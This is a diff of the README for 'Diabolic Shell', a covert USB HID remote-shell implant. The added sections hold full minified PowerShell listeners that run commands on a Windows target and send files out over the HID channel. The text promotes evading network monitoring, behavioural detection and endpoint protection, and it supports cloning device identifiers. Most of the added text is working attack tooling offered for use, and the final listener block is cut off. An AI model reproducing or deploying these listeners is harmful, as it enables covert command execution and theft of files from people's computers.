@@ -10,7 +10,7 @@ Diabolic Shell is a covert, encrypted, bidirectional HID channel built into the 
 - **Real-Time Command Execution:** Send commands and receive output instantly via the Web UI
 - **Covert File Exfiltration:** Extract files through the same HID channel — no network traffic generated
 - **Encrypted Communication:** Optional AES-128-CBC encryption for command payloads with TRNG-generated keys
-- **Adaptive Flow Control:** The Diabolic Parasite supports adaptive flow control through defined opcodes, allowing the device to signal the listener to adjust transmission speed to avoid heap runout or data corruption. **Note:** This feature is not implemented in the provided reference listeners — if you require flow control for large file transfers, you will need to implement it in your custom listener by polling the Feature Report buffer for flow control signals (see Flow Control Signals section).
+- **Adaptive Flow Control:** The Diabolic Parasite supports adaptive flow control through defined opcodes, allowing the device to signal the listener to adjust transmission speed to avoid heap runout or data corruption.
 
 ### Architecture Overview
 
@@ -67,7 +67,7 @@ For best results during large file exfiltration:
 
 ---
 
-## Why Diabolic Shell is Covert?
+## Covert by Design
 
 Diabolic Shell operates through a hardware-based USB HID channel — the same type of channel that gaming mice use for DPI settings, RGB peripherals use for lighting control, and devices use for firmware updates. It's completely normal USB traffic that exists on virtually every modern peripheral connected to any computer.
 
@@ -75,7 +75,7 @@ Diabolic Shell operates through a hardware-based USB HID channel — the same ty
 
 **No network traffic.** Network monitoring sees nothing — all data travels over USB.
 
-**No suspicious processes.** Behavioral analysis finds nothing unusual — the listener executes commands through standard shell mechanisms.
+**Native shell execution.** Commands execute through standard Windows shell mechanisms, avoiding process injection or suspicious API patterns that trigger heuristic detection. Diabolic Shell is a transport layer — how you execute commands on the target is entirely up to you. Build your own listener with custom evasion techniques, alternative execution methods, or integrate with existing tooling.
 
 **No file system anomalies.** Endpoint protection triggers nothing.
 
@@ -261,7 +261,7 @@ Your listener must locate the Parasite by matching these identifiers:
 | Usage Page | `0xFF00` | Vendor-defined HID usage page |
 | Report ID | `6` | Report ID for all communications |
 
-**Note:** VID/PID may vary depending on the HID device attached to your Parasite. These values should be configurable in your listener. Alternatively, you can implement a mechanism in your listener that matches other parameters (such as Usage Page and Report ID) while ignoring the VID/PID — this allows the listener to work regardless of which device is cloned.
+**Note:** VID/PID may vary depending on the HID device attached to your Parasite. These values should be configurable in your listener. The advanced listeners include a fallback matching mechanism that matches based on Usage Page, Usage, and Report Lengths when the exact VID/PID is not found — allowing the listener to work regardless of which device is cloned. If using a basic listener, you can implement similar logic or manually update the VID/PID values to match your configuration.
 
 
 ## Report Types
@@ -592,19 +592,184 @@ $d=G;if(!$d){exit}W $d "Ready";$bf="";$rx=0;while(1){$b=[byte[]]::new($d.I);$r=0
 
 ---
 
+## Advanced Listener Features
+
+The advanced listeners include additional features for more robust and resilient operation:
+
+### Auto-Reconnect
+
+Advanced listeners automatically detect when the device connection is lost (e.g., due to USB reconnection, system sleep/wake, or device reset) and will continuously attempt to reconnect. The reconnection interval is controlled by the `$RC` parameter (default: 3 seconds).
+
+When connection is lost:
+1. The listener detects the failed read operation
+2. The existing device handle is closed
+3. The listener enters a polling loop, searching for the device every `$RC` seconds
+4. Once the device is found, connection is re-established and a "Ready" message is sent
+
+### VID/PID Fallback
+
+Advanced listeners implement a two-tier device matching strategy for maximum flexibility:
+
+**Primary Match (Exact):** First attempts to match the exact VID (`$VI`) and PID (`$PI`) configured in the listener.
+
+**Fallback Match (Parameters):** If no exact VID/PID match is found, the listener falls back to matching based on:
+- Usage Page (`$UP` = 0xFF00)
+- Usage (`$UG` = 0x01)
+- Input Report Length (`$IL` = 64)
+- Output Report Length (`$OL` = 64)
+- Feature Report Length (`$FL` = 64)
+
+This allows the listener to work with any HID device that has the correct report structure, regardless of the cloned VID/PID. This is particularly useful when operating with different passthrough devices or when the VID/PID may change between deployments.
+
+### Additional Advanced Listener Parameters
+
+| Parameter | Default | Description |
+|-----------|---------|-------------|
+| `$RC` | `3` | Reconnect interval in seconds |
+| `$UG` | `0x01` | Usage ID for fallback matching |
+| `$IL` | `64` | Expected Input Report Length for fallback |
+| `$OL` | `64` | Expected Output Report Length for fallback |
+| `$FL` | `64` | Expected Feature Report Length for fallback |
+| `$SD` | `100` | SLOW signal delay in milliseconds (flow control listeners only) |
+| `$SSD` | `200` | SLOWER signal delay in milliseconds (flow control listeners only) |
+
+---
+
+### Advanced Feature Report Listener (`advanced_feature_report.ps1`)
+
+Feature Report listener with auto-reconnect and VID/PID fallback. Interactive shell sessions supported.
+
+```powershell
+$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
+Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
+function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
+function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
+function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
+function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
+function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG-and$sb[2]-eq0xFF){return $true}}}catch{};return $false}
+function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SR $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){if(($cn%50-eq0)-and(CS $D)){W $D "STOPPED";return};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SR $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SR $D ([byte[]]@($MG,0xCC))}
+function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
+function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
+function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
+function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
+function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
+function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
+$d=CN;W $d "Ready";$bf="";$rx=0
+while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
+```
+
+---
+
+### Advanced Feature Report Listener with Flow Control (`advanced_feature_report_flowcontrol.ps1`)
+
+Feature Report listener with auto-reconnect, VID/PID fallback, and full adaptive flow control support.
+
+```powershell
+# Config
+$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$false;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
+# Flow control delays (ms) - adjust these to tune transfer speed
+$SD=100   # SLOW delay (when WS queue > 5)
+$SSD=200  # SLOWER delay (when WS queue > 8)
+Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
+function G{$g=[Guid]::Empty;[H]::HidD_GetHidGuid([ref]$g);$s=[H]::SetupDiGetClassDevs([ref]$g,0,0,18);if(!$s){return}$n=0;$di=New-Object H+DI;$di.cb=[H]::Z($di);$fb=$null;while([H]::SetupDiEnumDeviceInterfaces($s,0,[ref]$g,$n++,[ref]$di)){$r=0;[H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,0,0,[ref]$r,0)>$x;$b=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::WriteInt32($b,$(if([IntPtr]::Size-eq8){8}else{5}));if([H]::SetupDiGetDeviceInterfaceDetail($s,[ref]$di,$b,$r,[ref]$r,0)){$h=[H]::CreateFile([Runtime.InteropServices.Marshal]::PtrToStringAuto([IntPtr]::Add($b,4)),-1073741824,3,0,3,0,0);if(!$h.IsInvalid){$a=New-Object H+A;$a.s=[H]::Z($a);if([H]::HidD_GetAttributes($h,[ref]$a)){$p=0;if([H]::HidD_GetPreparsedData($h,[ref]$p)){$c=New-Object H+C;[H]::HidP_GetCaps($p,[ref]$c)>$x;[H]::HidD_FreePreparsedData($p)>$x;if($c.up-eq$UP){if($a.v-eq$VI-and$a.p-eq$PI){[Runtime.InteropServices.Marshal]::FreeHGlobal($b);[H]::SetupDiDestroyDeviceInfoList($s)>$x;return @{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1}}elseif(!$fb-and$c.u-eq$UG-and$c.il-eq$IL-and$c.ol-eq$OL-and$c.fl-eq$FL){$fb=@{H=$h;I=$c.il;O=$c.ol;F=$c.fl;P=$c.fl-1};continue}}}}$h.Close()}}[Runtime.InteropServices.Marshal]::FreeHGlobal($b)};[H]::SetupDiDestroyDeviceInfoList($s)>$x;return $fb}
+function SR($D,[byte[]]$A){for($i=0;$i-lt$A.Length;$i+=$D.P){$z=[Math]::Min($D.P,$A.Length-$i);$p=[byte[]]::new($D.F);$p[0]=$RI;[Array]::Copy($A,$i,$p,1,$z);$rt=0;while(-not[H]::HidD_SetFeature($D.H,$p,$p.Length)){$rt++;if($rt-gt$MR){break}Sleep -M 5};[H]::U($RD)}}
+function W($D,$T){SR $D ([Text.Encoding]::ASCII.GetBytes("$T`n"))}
+function SE($D,$M){$b=[Text.Encoding]::UTF8.GetBytes($M);$l=[Math]::Min($b.Length,255);$f=[byte[]]::new(3+$l);$f[0]=$MG;$f[1]=0xEE;$f[2]=$l;[Array]::Copy($b,0,$f,3,$l);SR $D $f}
+# Flow control check - returns: STOP, SLOWER, SLOW, or NORMAL
+function CS($D){$sb=[byte[]]::new($D.F);$sb[0]=$RI;try{if([H]::HidD_GetFeature($D.H,$sb,$sb.Length)){if($sb[1]-eq$MG){switch($sb[2]){0xFF{return 'STOP'}0xFC{return 'SLOWER'}0xFE{return 'SLOW'}0xFD{return 'NORMAL'}}}}}catch{};return 'NORMAL'}
+# File transfer with flow control
+function F($D,$P){$P=[Environment]::ExpandEnvironmentVariables($P);if(!(Test-Path $P)){SE $D "Not found";return}if((Get-Item $P).PSIsContainer){SE $D "Is directory";return}try{$fb=[IO.File]::ReadAllBytes($P)}catch{SE $D "Read error";return}if($fb.Length-gt10MB){SE $D "Too large";return}$fn=[IO.Path]::GetFileName($P);$fs=$fb.Length;$nb=[Text.Encoding]::UTF8.GetBytes($fn);$nl=[Math]::Min($nb.Length,255);$sf=[byte[]]::new(7+$nl);$sf[0]=$MG;$sf[1]=0xAA;$sf[2]=$fs-band 0xFF;$sf[3]=($fs-shr 8)-band 0xFF;$sf[4]=($fs-shr 16)-band 0xFF;$sf[5]=($fs-shr 24)-band 0xFF;$sf[6]=$nl;[Array]::Copy($nb,0,$sf,7,$nl);SR $D $sf;Sleep -M $MD;$cn=0;for($i=0;$i-lt$fs;$i+=$BC){$sg=CS $D;if($sg-eq'STOP'){W $D "STOPPED";return};if($sg-eq'SLOWER'){Sleep -M $SSD}elseif($sg-eq'SLOW'){Sleep -M $SD};$cn++;$cs=[Math]::Min($BC,$fs-$i);$df=[byte[]]::new(4+$cs);$df[0]=$MG;$df[1]=0xBB;$df[2]=$cs-band 0xFF;$df[3]=($cs-shr 8)-band 0xFF;[Array]::Copy($fb,$i,$df,4,$cs);SR $D $df;if($cn%4-eq0){Sleep -M $BD}};Sleep -M $MD;SR $D ([byte[]]@($MG,0xCC))}
+function Y($z){$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$k=[byte[]]::new(16);$v=[byte[]]::new(16);for($i=0;$i-lt16;$i++){$k[$i]=[Convert]::ToByte($KY.Substring($i*2,2),16);$v[$i]=[Convert]::ToByte($IV.Substring($i*2,2),16)};$a.Key=$k;$a.IV=$v;(New-Object IO.StreamReader([Security.Cryptography.CryptoStream]::new([IO.MemoryStream]::new([Convert]::FromBase64String($z)),$a.CreateDecryptor(),'Read'))).ReadToEnd()}
+function DR($ms){if(!$script:SH-or$script:SH.HasExited){return""};$sb=New-Object Text.StringBuilder;$e=[Console]::OutputEncoding;$dl=[DateTime]::Now.AddMilliseconds($ms);while([DateTime]::Now-lt$dl-and!$script:SH.HasExited){if(!$script:OT){$script:OT=$script:SH.StandardOutput.BaseStream.ReadAsync($script:OB,0,$BZ)};if($script:OT.IsCompleted){if($script:OT.Result-gt0){[void]$sb.Append($e.GetString($script:OB,0,$script:OT.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:OT=$null};if(!$script:ET){$script:ET=$script:SH.StandardError.BaseStream.ReadAsync($script:EB,0,$BZ)};if($script:ET.IsCompleted){if($script:ET.Result-gt0){[void]$sb.Append($e.GetString($script:EB,0,$script:ET.Result));$dl=[DateTime]::Now.AddMilliseconds(300)};$script:ET=$null};Sleep -M 10};$sb.ToString().TrimEnd()}
+function SS($e){try{$script:SH=New-Object Diagnostics.Process;$script:SH.StartInfo.FileName=$e;$script:SH.StartInfo.UseShellExecute=$false;$script:SH.StartInfo.RedirectStandardInput=$true;$script:SH.StartInfo.RedirectStandardOutput=$true;$script:SH.StartInfo.RedirectStandardError=$true;$script:SH.StartInfo.CreateNoWindow=$true;if($script:SH.Start()){$script:OT=$null;$script:ET=$null;return $true}}catch{};$script:SH=$null;$false}
+function KS{if($script:SH){try{if(!$script:SH.HasExited){$script:SH.Kill()};$script:SH.Dispose()}catch{};$script:SH=$null;$script:OT=$null;$script:ET=$null}}
+function TX($c){if($script:SH-and!$script:SH.HasExited){try{$script:SH.StandardInput.WriteLine($c)}catch{KS;return""};DR 1500}else{""}}
+function CN{while(1){$d=G;if($d){Write-Host "Connected";return $d};Write-Host "Waiting...";Sleep -S $RC}}
+$d=CN;W $d "Ready";$bf="";$rx=0
+while(1){$b=[byte[]]::new($d.I);$r=0;$ok=$false;try{$ok=[H]::ReadFile($d.H,$b,$b.Length,[ref]$r,0)-and$r-gt0}catch{};if(-not$ok){Write-Host "Reconnecting...";try{$d.H.Close()}catch{};$d=CN;W $d "Ready";$bf="";$rx=0;continue};$s=[Text.Encoding]::ASCII.GetString($b,1,$b.Length-1).TrimEnd([char]0);if($s){if($s-match'<<START:\d+>>'){$bf="";$rx=1;$s=$s-replace'<<START:\d+>>'}if($s-match'<<END>>'){$s=$s-replace'<<END>>';$bf+=$s;$rx=0;$t=$bf.Trim();if($t){$c=if($EN){try{Y $t}catch{W $d "ERR";$bf="";continue}}else{$t};if($c){$c=$c.Trim();if($c-match'^DOWNLOAD\s+(.+)$'){F $d $Matches[1].Trim()}elseif(($c-ieq"cmd"-or$c-ieq"cmd.exe")-and!$script:SH){if(SS "cmd.exe"){$o=DR 800;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif(($c-ieq"powershell"-or$c-ieq"powershell.exe")-and!$script:SH){if(SS "powershell.exe"){$o=DR 1500;W $d $(if($o){$o}else{"OK"})}else{W $d "ERR"}}elseif($c-ieq"exit"-and$script:SH){KS;W $d "OK"}elseif($script:SH){if($script:SH.HasExited){KS;try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}else{$o=TX $c;W $d $(if($o){$o}else{"OK"})}}else{try{$o=(&([scriptblock]::Create($c))2>&1|Out-String).Trim()}catch{$o="ERR:$_"};W $d $(if($o){$o}else{"OK"})}}$bf=""}}elseif($rx){$bf+=$s}}}
+```
+
+---
+
+### Advanced Output Report Listener (`advanced_output_report.ps1`)
+
+Output Report listener with auto-reconnect and VID/PID fallback. Higher throughput for file transfers.
+
+```powershell
+$VI=0x303a;$PI=0x0002;$UP=0xFF00;$UG=0x01;$IL=64;$OL=64;$FL=64;$RI=6;$BC=512;$RD=1500;$BD=10;$MD=30;$BZ=16384;$MG=0xD1;$KY="172C6371FEDFD66DC2F9B89F01779D55";$IV="A4D4BA68394CB046DB232032430E58F4";$EN=$true;$RU=1000;$MR=20;$RC=3;$script:SH=$null;$script:OT=$null;$script:ET=$null;$script:OB=[byte[]]::new($BZ);$script:EB=[byte[]]::new($BZ)
+Add-Type 'using System;using System.Runtime.InteropServices;using Microsoft.Win32.SafeHandles;using System.Diagnostics;public class H{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool ReadFile(SafeFileHandle h,byte[]b,uint n,out uint r,IntPtr o);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool WriteFile(SafeFileHandle h,byte[]b,uint n,out uint w,IntPtr o);[DllImport("setupapi.dll")]public static extern IntPtr SetupDiGetClassDevs(ref Guid g,IntPtr e,IntPtr p,uint f);[DllImport("setupapi.dll")]public static extern bool SetupDiEnumDeviceInterfaces(IntPtr i,IntPtr d,ref Guid g,uint m,ref DI r);[DllImport("setupapi.dll",CharSet=CharSet.Auto)]public static extern bool SetupDiGetDeviceInterfaceDetail(IntPtr i,ref DI d,IntPtr t,uint s,out uint r,IntPtr x);[DllImport("setupapi.dll")]public static extern bool SetupDiDestroyDeviceInfoList(IntPtr i);[DllImport("hid.dll")]public static extern void HidD_GetHidGuid(out Guid g);[DllImport("hid.dll")]public static extern bool HidD_GetAttributes(SafeFileHandle h,ref A a);[DllImport("hid.dll")]public static extern bool HidD_GetPreparsedData(SafeFileHandle h,out IntPtr p);[DllImport("hid.dll")]public static extern bool HidD_FreePreparsedData(IntPtr p);[DllImport("hid.dll")]public static extern int HidP_GetCaps(IntPtr p,out C c);[DllImport("hid.dll")]public static extern bool HidD_SetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_GetFeature(SafeFileHandle h,byte[]b,uint l);[DllImport("hid.dll")]public static extern bool HidD_SetOutputReport(SafeFileHandle h,byte[]b,uint l);[DllImport("kernel32.dll",CharSet=CharSet.Auto)]public static extern SafeFileHandle CreateFile(string f,int a,uint s,IntPtr c,uint m,uint l,IntPtr t);[StructLayout(LayoutKind.Sequential)]public struct DI{public uint cb;public Guid g;public uint f;public IntPtr r;}[StructLayout(LayoutKind.Sequential)]public struct A{public uint s;public ushort v,p,n;}[StructLayout(LayoutKind.Sequential)]public struct C{public ushort u,up,il,ol,fl;[MarshalAs(UnmanagedType.ByValArray,SizeConst=17)]public ushort[]r;public ushort n1,n2,n3,n4,n5,n6,n7,n8,n9,n10;}public static int Z(object o){return Marshal.SizeOf(o);}public static void U(int us){long t=Stopwatch.GetTimestamp()+us*(Stopwatch.Frequency/1000000);while(Stopwatch.GetTimestamp()<t);}}'
